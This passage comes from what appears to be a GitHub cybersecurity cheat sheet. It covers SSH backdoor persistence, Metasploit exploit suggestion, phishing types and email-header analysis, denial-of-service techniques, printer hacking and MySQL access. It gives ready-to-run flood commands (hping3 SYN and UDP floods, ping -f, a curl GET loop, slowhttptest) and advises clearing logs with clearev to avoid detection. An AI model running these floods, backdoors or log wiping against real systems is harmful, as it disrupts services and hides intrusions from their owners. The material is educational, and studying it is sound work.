#### Using SSH
Create a `.ssh` folder in the home directory of the user you want to keep a backdoor. Keep in mind that the permissions of the `.ssh` folder should be `700` and the files withing should be `600`.

### Using exploit suggesters
MetaSploit has a tool called `suggester` that can be used to find exploits for a specific system.  
```bash
msf6 > use post/multi/recon/local_exploit_suggester
```

### Clean up
After you have escalated your privileges, you should clean up the logs to avoid detection. One tool for this is the `clearev` command for metasploit.  
```bash
msf6 > clearev
```

# Vulnerabilities & Threats
A vulnerability in cybersecurity is defined as a weakness or flaw in the design, implementation or behaviours of a system or application. An attacker can exploit these weaknesses to gain access to unauthorised information or perform unauthorised actions

There are arguably five main categories of vulnerabilities:
| Vulnerability | Description |
|:---:|:---:|
| Operating System | These types of vulnerabilities are found within Operating Systems (OSs) and often result in privilege escalation. |
| (Mis)Configuration-based | These types of vulnerability stem from an incorrectly configured application or service. For example, a website exposing customer details. |
| Weak or Default Credentials | Applications and services that have an element of authentication will come with default credentials when installed. For example, an administrator dashboard may have the username and password of "admin". These are easy to guess by an attacker.  |
| Application Logic | These vulnerabilities are a result of poorly designed applications. For example, poorly implemented authentication mechanisms that may result in an attacker being able to impersonate a user. |
| Human-Factor | Human-Factor vulnerabilities are vulnerabilities that leverage human behaviour. For example, phishing emails are designed to trick humans into believing they are legitimate. |

## Social Engineering
### Phishing

#### Phishing terms
**A BEC (Business Email Compromise)** is when an adversary gains control of an internal employee's account and then uses the compromised email account to convince other internal employees to perform unauthorized or fraudulent actions. 

**A typosquatting attack**, also known as a URL hijacking, a sting site, or a fake URL, is a type of social engineering where threat actors impersonate legitimate domains for malicious purposes such as fraud or malware spreading.

#### Types of Phishing attacks
**Spam**   
Unsolicited junk emails sent out in bulk to a large number of recipients. The more malicious variant of Spam is known as MalSpam.

**Phishing**   
Emails sent to a target(s) purporting to be from a trusted entity to lure individuals into providing sensitive information. 

**Spear phishing**   
Takes phishing a step further by targeting a specific individual(s) or organization seeking sensitive information.  

**Whaling**  
Is similar to spear phishing, but it's targeted specifically to C-Level high-position individuals (CEO, CFO, etc.), and the objective is the same. 

**Smishing**   
Takes phishing to mobile devices by targeting mobile users with specially crafted text messages. 

**Vishing**   
Is similar to smishing, but instead of using text messages for the social engineering attack, the attacks are based on voice calls. 

#### Analyze/identify
1. Open Email
2. See its raw format
3. Analyze the results:

* **X-Originating-IP** - The IP address of the email was sent from (this is known as an X-header)
* **Smtp.mailfrom/header.from** - The domain the email was sent from (these headers are within Authentication-Results)
* **Reply-To** - This is the email address a reply email will be sent to instead of the From email address

In case the mail is encoded using base64, the following command can be used to decrypt the message:  
`base64 -d <filename> > decrypted.<filetype>` 

#### Phishing security
Hyperlinks and IP addresses should be [defanged](https://www.ibm.com/docs/en/rsoa-and-rp/32.0?topic=SSBRUQ_32.0.0/com.ibm.resilient.doc/install/resilient_install_defangURLs.htm).

Expand shortened links with this [tool](https://www.expandurl.net).
## Denial of Service (DoS & DDoS)
Denial of Service attacks aim to make a system, service, or network unavailable by overwhelming it with traffic or exploiting vulnerabilities.

### Types of DoS Attacks
- **DoS (Denial of Service)**: Single-source attack
- **DDoS (Distributed Denial of Service)**: Multiple-source coordinated attack
- **Application Layer**: Targets specific applications (HTTP, DNS)
- **Network Layer**: Floods network infrastructure
- **Protocol**: Exploits protocol weaknesses

### Common DoS Techniques

#### Network Flooding
```bash
# ICMP flood (requires root)
ping -f -s 65507 <target_ip>

# SYN flood using hping3
hping3 -S --flood -V -p 80 <target_ip>

# UDP flood
hping3 --udp --flood -p 53 <target_ip>
```

#### Application Layer Attacks
```bash
# HTTP GET flood using curl
for i in {1..1000}; do curl http://target.com & done

# Slowloris attack (slow HTTP)
# Use tools like slowhttptest or pyloris
```

#### Amplification Attacks
- **DNS Amplification**: Small query → Large response
- **NTP Amplification**: Exploits NTP monlist command
- **Memcached Amplification**: UDP-based amplification

### Detection and Mitigation
- **Rate Limiting**: Limit requests per IP/user
- **Traffic Analysis**: Monitor unusual patterns
- **Blacklisting**: Block malicious IPs
- **Load Balancing**: Distribute traffic
- **CDN**: Content delivery networks for protection
- **Firewalls**: Filter malicious traffic

### Tools for Testing (Educational/Legal Use Only)
```bash
# LOIC (Low Orbit Ion Cannon) - GUI tool
# HOIC (High Orbit Ion Cannon) - More advanced
# slowhttptest - Application layer DoS testing
slowhttptest -c 1000 -H -g -o my_body_stats -i 110 -r 200 -t GET -u http://target.com/

# Stress testing with Apache Bench
ab -n 10000 -c 100 http://target.com/
```

Legal Warning: Only test on systems you own or have explicit permission to test. Unauthorized DoS attacks are illegal.
## Misconfigurations
### Printer Hacking (IPP)
Enumeration and exploitation tools can be found [here](https://github.com/RUB-NDS/PRET).  
Printer security cheat sheet can be found [here](http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet).

It allows clients to submit one or more print jobs to the printer or print server, and perform tasks such as querying the status of a printer, obtaining the status of print jobs, or canceling individual print jobs."  
Most of them appear to run the CUPS server (which is a simple UNIX printing system).  

Running `python pret.py` will start an automatic printer discovery in your local network. 

# Miscellaneous
Additional tools and techniques that don't fit into other categories but are useful for cybersecurity work.

## Shortened URLs
You can see the actual website the shortened link is redirecting you to by appending "+" to it (see the examples below). Type the shortened URL in the address bar of the web browser and add the above characters to see the redirect URL.

Example: 
[tinyurl.com/mv2h897s+](https://tinyurl.com/mv2h897s+)

Example providers:
- bit.ly
- goo.gl
- ow.ly
- s.id
- smarturl.it
- tiny.pl
- tinyurl.com
- x.co

## Reading SQL databases
Ensure you have the knowlege of SQL DBs first. See [here](/More/Databases).

Start by starting the mysql service:
```bash
service mysql start
```

### Remote Connection
Then connect to the database:
```bash
mysql -u root -p -h <ip_address>
```

Now you can use the following commands to read the database:
```sql
show databases;
use <database_name>;
show tables;
select * from <table_name>;
describe <table_name>;
```

### Local Connection
If you have access to the database file, you can use the following command to read it:
```bash
mysql -u <username> -p
```

Type "source" followed by the filename of the mysql database to specify that you wish to view its database.

```sql
source /home/berkan/serverLx/employees.sql -- example
```

You can now view the database using the commands from the previous section.

---

<h3 align="center">
  <strong>I hope you found this useful! 🚀</strong>
</h2>

<p align="center">If you think others could benefit, please consider sharing it with your network or giving it a star ⭐ on GitHub - every bit of support helps this project grow and reach more people. And if you’re enjoying the content as much as I am, a little ☕ goes a long way in keeping it fueled!</p>

<p align="center">Thank you for being part of this journey, and happy hacking! </p>

<br>


<p align="center">
  <a href="https://www.buymeacoffee.com/berkanktk" target="_blank">
    <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" height="50px">
  </a>
</p>

---
<div align="center">
	
[![Share on LinkedIn](https://img.shields.io/badge/Share%20on-LinkedIn-blue?logo=linkedin&style=flat-square)](https://www.linkedin.com/sharing/share-offsite/?url=https://github.com/Berkanktk/CyberSecurity)
[![Share on Twitter](https://img.shields.io/badge/Share%20on-Twitter-blue?logo=x&style=flat-square)](https://twitter.com/intent/tweet?text=Check%20out%20this%20awesome%20cybersecurity%20resource!&url=https://github.com/Berkanktk/CyberSecurity&hashtags=cybersecurity,opensource,github)
[![Share on Facebook](https://img.shields.io/badge/Share%20on-Facebook-blue?logo=facebook&style=flat-square)](https://www.facebook.com/sharer/sharer.php?u=https://github.com/Berkanktk/CyberSecurity)
[![Share on WhatsApp](https://img.shields.io/badge/Share%20on-WhatsApp-brightgreen?logo=whatsapp&style=flat-square)](https://api.whatsapp.com/send?text=Check%20out%20this%20awesome%20cybersecurity%20resource!%20https://github.com/Berkanktk/CyberSecurity)

</div>
